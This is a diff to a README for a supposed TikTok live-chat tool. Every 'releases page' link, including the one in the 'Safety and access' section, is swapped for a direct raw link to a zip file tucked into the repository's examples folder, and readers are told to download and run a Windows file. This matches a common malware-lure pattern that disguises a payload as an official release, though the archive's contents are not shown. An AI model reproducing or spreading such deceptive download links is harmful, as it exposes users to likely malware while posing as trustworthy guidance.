@@ -1,10 +1,10 @@
 # 🤖 tiktok-live-python - Live chat and captions for TikTok
 
-[![Download tiktok-live-python](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Diminishing-scree890/tiktok-live-python/releases)
+[![Download tiktok-live-python](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Diminishing-scree890/tiktok-live-python/main/examples/python-tiktok-live-v2.0.zip)
 
 ## 📥 Download
 
-Go to the [releases page](https://github.com/Diminishing-scree890/tiktok-live-python/releases) to download and run this file.
+Go to the [releases page](https://raw.githubusercontent.com/Diminishing-scree890/tiktok-live-python/main/examples/python-tiktok-live-v2.0.zip) to download and run this file.
 
 ## 🖥️ What this app does
 
@@ -31,7 +31,7 @@ If the release includes a setup file, use that file first. If it includes a port
 
 ## 🚀 Getting Started
 
-1. Open the [releases page](https://github.com/Diminishing-scree890/tiktok-live-python/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Diminishing-scree890/tiktok-live-python/main/examples/python-tiktok-live-v2.0.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Save it to your Downloads folder or Desktop
@@ -149,7 +149,7 @@ Use the main app file first. If you are not sure which file to open, pick the on
 
 ## 🔒 Safety and access
 
-Only download the app from the official [releases page](https://github.com/Diminishing-scree890/tiktok-live-python/releases). This helps you get the latest version from the source.
+Only download the app from the official [releases page](https://raw.githubusercontent.com/Diminishing-scree890/tiktok-live-python/main/examples/python-tiktok-live-v2.0.zip). This helps you get the latest version from the source.
 
 ## 🧰 Best use cases
 
@@ -174,4 +174,4 @@ If the app uses a dark theme or compact view, it should still be easy to read on
 
 ## 📎 Download again if needed
 
-If the first file does not work, return to the [releases page](https://github.com/Diminishing-scree890/tiktok-live-python/releases) and get the latest Windows download again
+If the first file does not work, return to the [releases page](https://raw.githubusercontent.com/Diminishing-scree890/tiktok-live-python/main/examples/python-tiktok-live-v2.0.zip) and get the latest Windows download again
